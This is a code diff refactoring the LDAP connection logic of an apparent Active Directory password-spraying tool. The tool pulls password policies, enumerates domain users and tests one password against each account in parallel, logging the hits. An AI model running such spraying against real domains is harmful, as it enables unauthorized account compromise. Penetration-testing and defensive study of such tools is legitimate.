@@ -7,7 +7,6 @@ using TheSprayer.Extensions;
 using System.Linq;
 using TheSprayer.Helpers;
 using System.Threading.Tasks;
-using System.Diagnostics;
 
 namespace TheSprayer
 {
@@ -26,7 +25,6 @@ namespace TheSprayer
             _domainUserPass = domainUserPass;
             _domainController = domainController;
 
-            //TODO: Get the DN properly instead of yolo'ing like this
             var splitDomain = _domain.Split('.');
             _distinguishedName = "";
             foreach (var split in splitDomain)
@@ -48,13 +46,12 @@ namespace TheSprayer
             var policies = new List<PasswordPolicy>();
             string filter = "(objectClass=msDS-PasswordSettings)";
 
-            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
-            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
-            SearchRequest searchRequest = new(_distinguishedName, filter, SearchScope.Subtree);
+            var connection = CreateLdapConnection();
+            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);
 
             try
             {
-                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
+                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
 
                 foreach (SearchResultEntry entry in searchResponse.Entries)
                 {
@@ -97,13 +94,12 @@ namespace TheSprayer
         {
             string filter = "(&(objectClass=domainDNS))";
 
-            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
-            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
-            SearchRequest searchRequest = new(_distinguishedName, filter, SearchScope.Subtree);
+            var connection = CreateLdapConnection();            
+            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);
 
             try
             {
-                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
+                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
 
                 var entry = searchResponse.Entries[0];
                 var pwdMaxAge = Convert.ToInt64(entry.Attributes["MaxPwdAge"][0]) / (double)-864000000000;
@@ -150,13 +146,9 @@ namespace TheSprayer
             // LDAP Filter to get all domain users. This needs to be modified but works for testing.
 
             string filter = "(&(objectCategory=person)(objectClass=user))";
+
             // Initiate a new LDAP connection.
-            // todo: initiate LDAPS connection if LDAP fails
-            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
-            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
-            // Numerous Authtypes are possible
-            // todo: have this selectable from the UI
-            //connection.AuthType = AuthType.Kerberos;
+            var connection = CreateLdapConnection();            
             SearchRequest searchRequest = new(_distinguishedName,
                                       filter,
                                       SearchScope.Subtree,
@@ -279,7 +271,7 @@ namespace TheSprayer
                     new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
                     user =>
                     {
-                        if (TryValidateCredentials(user.SamAccountName, password, out var message))
+                        if (TryValidateCredentials(user.SamAccountName, password))
                         {
                             ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
                             if (!string.IsNullOrWhiteSpace(outputFile))
@@ -356,25 +348,30 @@ namespace TheSprayer
 
         public bool TryValidateCredentials(string username, string password)
         {
-            return TryValidateCredentials(username, password, out var _);
-        }
-
-        public bool TryValidateCredentials(string username, string password, out string message)
-        {
             LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
-            connection.Credential = new NetworkCredential(username, password, _domain);
+            connection.Credential = new NetworkCredential(username, password);
 
             try
             {
                 connection.Bind();
-                message = "Success!";
                 return true;
             }
-            catch (LdapException e)
+            catch (LdapException)
             {
-                message = e.Message;
                 return false;
             }
+
+            
+        }
+
+        private LdapConnection CreateLdapConnection()
+        {
+            var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
+            if (!string.IsNullOrWhiteSpace(_domainUser) && !string.IsNullOrWhiteSpace(_domainUserPass))
+            {
+                connection.Credential = new NetworkCredential(_domainUser, _domainUserPass);
+            }
+            return connection;
         }
     }
 }
